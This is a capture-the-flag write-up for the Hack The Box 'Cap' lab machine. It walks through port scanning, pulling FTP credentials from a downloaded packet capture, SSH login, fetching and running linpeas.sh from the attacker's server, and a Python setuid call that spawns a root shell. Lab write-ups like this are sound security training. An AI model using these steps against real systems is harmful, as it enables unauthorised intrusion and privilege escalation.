# HTB - Cap

**IP Address:** `10.10.10.245`  
**OS:** Ubuntu 20.04  
**Difficulty:** Easy  
**Tags:** #FTP, #PCAP, #Wireshark, #SSH, #LinPEAS, #SUID, #Python

---

## 1. Port Scanning

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.10.10.245
```

**Result:**

- `21/tcp` → FTP (vsftpd 3.0.3)
- `22/tcp` → SSH (OpenSSH 8.2p1)
- `80/tcp` → HTTP (Gunicorn)

---

## 2. Web Enumeration

Navigating to `http://10.10.10.245` opens a "Security Dashboard" already logged in as `Nathan`.  
Clicking **Security Snapshot** changes the URL to `/capture/data/0`.

```text
/capture/data/0 → contains downloadable PCAP data
```

⬇️ Downloaded the `.pcap` file and opened it with **Wireshark**.

Filtered traffic by protocol **FTP** and discovered:

```text
Username: nathan
Password: Buck3tH4TF0RM3!
```

---

## 3. SSH Access

Used the recovered credentials:

```bash
ssh nathan@10.10.10.245
```

✅ SSH login successful  
🏁 **User flag retrieved from Nathan's home directory**

---

## 4. Privilege Escalation

### 4.1 Hosting linPEAS Locally

Started a local web server:

```bash
python3 -m http.server 8080
```

On victim machine, downloaded **linpeas.sh**:

```bash
wget http://10.10.14.105:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### 4.2 Root via Python SUID Abuse

`linpeas.sh` showed a possible misconfigured **SUID bit on Python3**.

On the victim:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

✅ Spawned a root shell  
🏁 **Root flag retrieved from `/root`**

---

# ✅ MACHINE COMPLETE
